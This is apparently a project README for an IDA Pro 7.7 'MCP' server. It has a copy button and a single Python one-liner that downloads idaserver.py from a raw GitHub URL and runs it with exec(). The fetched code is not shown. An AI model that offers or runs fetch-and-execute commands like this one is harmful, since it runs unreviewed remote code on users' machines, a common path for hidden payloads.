# Ida-pro-7.7-mcp
<div style="position: relative;">
  <button style="position: absolute; top: 5px; right: 5px; padding: 5px 10px; cursor: pointer;" onclick="navigator.clipboard.writeText(document.getElementById('script-code').textContent); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy', 2000);">Ida Pro 7.7 Python Script</button>
  <pre><code id="script-code">
# 1. Download & execute from GitHub in one line
exec(__import__('urllib.request').request.urlopen('https://raw.githubusercontent.com/Baconsoftworksllc/Ida-pro-7.7-mcp/refs/heads/main/idaserver.py').read().decode())
  </code></pre>
</div>
